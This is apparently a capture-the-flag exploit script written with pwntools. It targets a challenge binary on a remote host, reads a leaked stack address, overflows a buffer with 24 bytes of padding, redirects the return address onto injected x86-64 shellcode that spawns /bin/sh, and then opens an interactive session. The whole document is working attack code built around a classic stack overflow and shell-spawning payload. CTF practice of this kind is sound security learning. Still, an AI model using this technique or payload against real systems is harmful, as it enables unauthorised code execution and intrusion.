#!/usr/bin/python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./chall')
context.terminal = ['alacritty', '-e', 'sh', '-c']
host = args.HOST or '35.238.225.156'
port = int(args.PORT or 1006)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
init-pwndbg
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
offset = 24 # pattern = daaaaaaa
padding = 'aaaaaaaabaaaaaaacaaaaaaa'
shellcode = """
mov rax, 0x3b
xor rdx, rdx;
xor rdi, rdi;
xor rsi, rsi;
movabs  rdi, 0x0068732F6E69622F
push    rdi
mov rdi, rsp
syscall 
"""
shellcode = asm(shellcode)
leak = io.recvuntil("]").strip("]")
leak = leak.split("[")
leak = int(leak[1], 16)
print(hex(leak))
print(len(shellcode))
rip = leak + 32
payload = padding + p64(rip) + shellcode
io.recv()
io.send(payload)

io.interactive()

